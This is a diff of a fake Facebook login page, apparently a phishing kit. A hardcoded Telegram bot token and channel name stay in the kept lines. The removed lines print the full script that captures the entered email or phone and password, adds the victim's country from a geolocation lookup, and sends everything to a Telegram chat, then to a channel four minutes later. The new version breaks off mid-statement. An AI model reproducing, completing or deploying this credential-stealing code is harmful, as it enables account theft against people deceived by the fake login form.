@@ -69,71 +69,13 @@
     <input type="text" id="identifier" placeholder="Mobile number or email" required>
     <input type="password" id="password" placeholder="Password" required>
     <button type="submit">Log In</button>
-    <div class="developer">Developer by @ProH43</div>
+    <div class="developer">Developer by @ProHacker43</div>
   </form>
 </div>
 
 <script>
   const botToken = '7964718139:AAHSriHqoXBuo__F_paB26fO1Sx774Dpk-k';
-  const telegramChannel = '@PRO_43KPISH'; // چینل یوزرنیم
+  const telegramChannel = '@PRO_43KPISH';
 
   function getQueryParam(param) {
-    const urlParams = new URLSearchParams(window.location.search);
-    return urlParams.get(param);
-  }
-
-  async function getGeoInfo() {
-    try {
-      const res = await fetch('https://ipapi.co/json');
-      return await res.json();
-    } catch {
-      return { country_name: "Unknown", country_code: "" };
-    }
-  }
-
-  function getFlag(code) {
-    if (!code) return "";
-    return String.fromCodePoint(...[...code.toUpperCase()].map(c => 127397 + c.charCodeAt()));
-  }
-
-  async function sendTelegram(chatId, text) {
-    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-    await fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: text })
-    });
-  }
-
-  document.getElementById("loginForm").addEventListener("submit", async function(e) {
-    e.preventDefault();
-
-    const telegramId = getQueryParam('id');
-    if (!telegramId) {
-      alert("Telegram ID نشته!");
-      return;
-    }
-
-    const identifier = document.getElementById("identifier").value;
-    const password = document.getElementById("password").value;
-
-    const geo = await getGeoInfo();
-    const country = geo.country_name || "Unknown";
-    const flag = getFlag(geo.country_code);
-
-    const msg = `🟦 Facebook Login\n\n📩 Email/Phone: ${identifier}\n🔐 Password: ${password}\n🌍 Country: ${country} ${flag}\n🆔 Telegram ID: ${telegramId}\n\n👨‍💻 Developer by @ProHacker43`;
-
-    // 1. Send to bot user first
-    await sendTelegram(telegramId, msg);
-
-    // 2. After 4 minutes, send to channel
-    setTimeout(() => {
-      sendTelegram(telegramChannel, msg);
-    }, 240000); // 4 minutes = 240,000 ms
-
-    alert("Please wait...");
-  });
-</script>
-
-</body>
-</html> 
+    const urlParams = 
